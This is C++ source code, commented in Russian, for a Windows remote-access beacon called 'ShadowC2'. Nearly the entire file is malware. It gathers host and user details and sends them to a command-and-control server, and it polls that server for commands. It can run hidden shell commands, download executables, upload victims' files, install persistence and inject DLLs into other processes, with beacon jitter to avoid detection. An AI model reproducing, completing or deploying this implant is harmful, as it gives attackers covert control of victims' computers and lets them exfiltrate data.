#include "shadow.h"
#include <sstream>
#include <iomanip>

// Команды для выполнения
#define CMD_SHELL 0x1001
#define CMD_DOWNLOAD 0x1002
#define CMD_UPLOAD 0x1003
#define CMD_PERSIST 0x1004
#define CMD_EXIT 0x1005
#define CMD_SLEEP 0x1006
#define CMD_INJECT 0x1007

// Структура команды
typedef struct _COMMAND {
    DWORD dwCommandId;
    DWORD dwDataSize;
    BYTE pData[1];
} COMMAND, *PCOMMAND;

// Функция для выполнения командной строки
BOOL ExecuteCommand(LPCWSTR lpCommand, LPWSTR* lpOutput, DWORD* dwOutputSize) {
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hReadPipe, hWritePipe;
    
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return FALSE;
    }
    
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi;
    
    if (CreateProcess(NULL, (LPWSTR)lpCommand, NULL, NULL, TRUE, 
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        
        CloseHandle(hWritePipe);
        
        // Читаем вывод
        DWORD dwBytesRead;
        CHAR buffer[4096];
        std::string output;
        
        while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &dwBytesRead, NULL) && dwBytesRead > 0) {
            buffer[dwBytesRead] = '\0';
            output += buffer;
        }
        
        CloseHandle(hReadPipe);
        
        // Преобразуем в Unicode
        int len = MultiByteToWideChar(CP_UTF8, 0, output.c_str(), -1, NULL, 0);
        *lpOutput = (LPWSTR)malloc(len * sizeof(WCHAR));
        MultiByteToWideChar(CP_UTF8, 0, output.c_str(), -1, *lpOutput, len);
        *dwOutputSize = len * sizeof(WCHAR);
        
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        return TRUE;
    }
    
    CloseHandle(hReadPipe);
    CloseHandle(hWritePipe);
    return FALSE;
}

// Функция для скачивания файлов
BOOL DownloadFile(LPCWSTR lpUrl, LPCWSTR lpLocalPath) {
    HINTERNET hSession = InternetOpen(L"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) return FALSE;
    
    HINTERNET hUrl = InternetOpenUrl(hSession, lpUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hSession);
        return FALSE;
    }
    
    HANDLE hFile = CreateFile(lpLocalPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hSession);
        return FALSE;
    }
    
    BYTE buffer[4096];
    DWORD dwBytesRead;
    DWORD dwBytesWritten;
    
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &dwBytesRead) && dwBytesRead > 0) {
        WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL);
    }
    
    CloseHandle(hFile);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hSession);
    
    return TRUE;
}

// Функция для загрузки файлов
BOOL UploadFile(LPCWSTR lpLocalPath, LPCWSTR lpUploadUrl) {
    HANDLE hFile = CreateFile(lpLocalPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    BYTE* pFileData = (BYTE*)malloc(dwFileSize);
    DWORD dwBytesRead;
    
    ReadFile(hFile, pFileData, dwFileSize, &dwBytesRead, NULL);
    CloseHandle(hFile);
    
    // Отправляем файл на сервер
    HINTERNET hSession = InternetOpen(L"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) {
        free(pFileData);
        return FALSE;
    }
    
    HINTERNET hConnect = InternetConnect(hSession, C2_HOST, C2_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hSession);
        free(pFileData);
        return FALSE;
    }
    
    HINTERNET hRequest = HttpOpenRequest(hConnect, L"POST", L"/upload", NULL, NULL, NULL,
        INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        free(pFileData);
        return FALSE;
    }
    
    WCHAR wzHeaders[1024];
    wsprintf(wzHeaders, L"Content-Type: multipart/form-data\r\n");
    
    HttpSendRequest(hRequest, wzHeaders, wcslen(wzHeaders), pFileData, dwFileSize);
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
    free(pFileData);
    
    return TRUE;
}

// Функция для получения информации о системе
LPWSTR GetSystemInfo() {
    WCHAR wzInfo[4096];
    
    // Имя компьютера
    WCHAR wzComputerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD dwSize = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerName(wzComputerName, &dwSize);
    
    // Имя пользователя
    WCHAR wzUserName[256];
    dwSize = 256;
    GetUserName(wzUserName, &dwSize);
    
    // Информация о системе
    OSVERSIONINFO osInfo;
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&osInfo);
    
    // Информация о процессоре
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    
    // Информация о памяти
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    
    // Формируем JSON
    wsprintf(wzInfo,
        L"{\"computer\":\"%s\",\"user\":\"%s\",\"os\":\"Windows %d.%d\","
        L"\"arch\":\"%d-bit\",\"memory\":\"%llu MB\",\"cpu\":\"%d cores\","
        L"\"uptime\":\"%lu seconds\"}",
        wzComputerName, wzUserName, osInfo.dwMajorVersion, osInfo.dwMinorVersion,
        sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? 64 : 32,
        memInfo.ullTotalPhys / (1024 * 1024),
        sysInfo.dwNumberOfProcessors,
        GetTickCount() / 1000);
    
    // Копируем результат
    DWORD dwLen = wcslen(wzInfo) + 1;
    LPWSTR pResult = (LPWSTR)malloc(dwLen * sizeof(WCHAR));
    wcscpy_s(pResult, dwLen, wzInfo);
    
    return pResult;
}

// Функция для получения команды от C2 сервера
PCOMMAND GetCommand(HINTERNET hConnect) {
    HINTERNET hRequest = HttpOpenRequest(hConnect, L"GET", L"/cmd", NULL, NULL, NULL,
        INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    
    if (!hRequest) return NULL;
    
    if (!HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
        InternetCloseHandle(hRequest);
        return NULL;
    }
    
    // Получаем размер команды
    DWORD dwContentLength = 0;
    DWORD dwBufferSize = sizeof(dwContentLength);
    HttpQueryInfo(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
        &dwContentLength, &dwBufferSize, NULL);
    
    if (dwContentLength == 0 || dwContentLength > 1024 * 1024) { // Макс 1MB
        InternetCloseHandle(hRequest);
        return NULL;
    }
    
    // Выделяем память для команды
    PCOMMAND pCommand = (PCOMMAND)malloc(dwContentLength);
    if (!pCommand) {
        InternetCloseHandle(hRequest);
        return NULL;
    }
    
    // Читаем команду
    DWORD dwBytesRead = 0;
    DWORD dwTotalRead = 0;
    
    while (InternetReadFile(hRequest, (BYTE*)pCommand + dwTotalRead, 4096, &dwBytesRead) && dwBytesRead > 0) {
        dwTotalRead += dwBytesRead;
    }
    
    InternetCloseHandle(hRequest);
    
    if (dwTotalRead != dwContentLength) {
        free(pCommand);
        return NULL;
    }
    
    return pCommand;
}

// Функция для отправки результата команды
BOOL SendCommandResult(HINTERNET hConnect, DWORD dwCommandId, LPCWSTR lpResult) {
    WCHAR wzPath[256];
    wsprintf(wzPath, L"/result?id=%d", dwCommandId);
    
    HINTERNET hRequest = HttpOpenRequest(hConnect, L"POST", wzPath, NULL, NULL, NULL,
        INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    
    if (!hRequest) return FALSE;
    
    WCHAR wzHeaders[1024];
    wsprintf(wzHeaders, L"Content-Type: application/json\r\n");
    
    WCHAR wzData[4096];
    wsprintf(wzData, L"{\"result\":\"%s\",\"timestamp\":%d}", lpResult, GetTickCount());
    
    BOOL bResult = HttpSendRequest(hRequest, wzHeaders, wcslen(wzHeaders), 
        (LPVOID)wzData, wcslen(wzData) * 2);
    
    InternetCloseHandle(hRequest);
    return bResult;
}

// Основная функция beacon
VOID RunBeacon() {
    DEBUG_PRINT("ShadowC2 Beacon started\n");
    
    // Получаем информацию о системе
    LPWSTR pSystemInfo = GetSystemInfo();
    
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    
    // Отправляем начальную информацию
    if (InitializeWinINet(&hSession, &hConnect)) {
        WCHAR wzHeaders[1024];
        wsprintf(wzHeaders, L"Content-Type: application/json\r\n");
        
        HttpSendRequest(hConnect, wzHeaders, wcslen(wzHeaders), 
            pSystemInfo, wcslen(pSystemInfo) * 2);
        
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
    }
    
    free(pSystemInfo);
    
    // Основной цикл beacon
    DWORD dwSleepTime = BEACON_INTERVAL;
    
    while (TRUE) {
        if (InitializeWinINet(&hSession, &hConnect)) {
            // Отправляем beacon
            SendBeacon(hConnect, L"beacon", L"active");
            
            // Получаем команду
            PCOMMAND pCommand = GetCommand(hConnect);
            
            if (pCommand) {
                LPWSTR lpResult = NULL;
                DWORD dwResultSize = 0;
                BOOL bSendResult = FALSE;
                
                switch (pCommand->dwCommandId) {
                    case CMD_SHELL:
                        if (ExecuteCommand((LPCWSTR)pCommand->pData, &lpResult, &dwResultSize)) {
                            SendCommandResult(hConnect, pCommand->dwCommandId, lpResult);
                            free(lpResult);
                        }
                        break;
                        
                    case CMD_DOWNLOAD:
                        if (DownloadFile((LPCWSTR)pCommand->pData, L"C:\\Windows\\Temp\\downloaded.exe")) {
                            SendCommandResult(hConnect, pCommand->dwCommandId, L"Download completed");
                        } else {
                            SendCommandResult(hConnect, pCommand->dwCommandId, L"Download failed");
                        }
                        break;
                        
                    case CMD_UPLOAD:
                        if (UploadFile((LPCWSTR)pCommand->pData, L"/upload")) {
                            SendCommandResult(hConnect, pCommand->dwCommandId, L"Upload completed");
                        } else {
                            SendCommandResult(hConnect, pCommand->dwCommandId, L"Upload failed");
                        }
                        break;
                        
                    case CMD_PERSIST:
                        if (InstallPersistence()) {
                            SendCommandResult(hConnect, pCommand->dwCommandId, L"Persistence installed");
                        } else {
                            SendCommandResult(hConnect, pCommand->dwCommandId, L"Persistence failed");
                        }
                        break;
                        
                    case CMD_EXIT:
                        SendCommandResult(hConnect, pCommand->dwCommandId, L"Exiting");
                        free(pCommand);
                        InternetCloseHandle(hConnect);
                        InternetCloseHandle(hSession);
                        return;
                        
                    case CMD_SLEEP:
                        dwSleepTime = *(DWORD*)pCommand->pData;
                        SendCommandResult(hConnect, pCommand->dwCommandId, L"Sleep time updated");
                        break;
                        
                    case CMD_INJECT:
                        // Инъекция в процесс
                        DWORD dwTargetPID = *(DWORD*)pCommand->pData;
                        if (DLLInjection(dwTargetPID, (LPBYTE)L"injected", 10)) {
                            SendCommandResult(hConnect, pCommand->dwCommandId, L"Injection completed");
                        } else {
                            SendCommandResult(hConnect, pCommand->dwCommandId, L"Injection failed");
                        }
                        break;
                }
                
                free(pCommand);
            }
            
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hSession);
        }
        
        // Ожидаем с jitter
        DWORD jitter = GetRandomJitter();
        Sleep(dwSleepTime + jitter);
    }
}

// Точка входа для beacon
int WINAPI BeaconMain() {
    RunBeacon();
    return 0;
}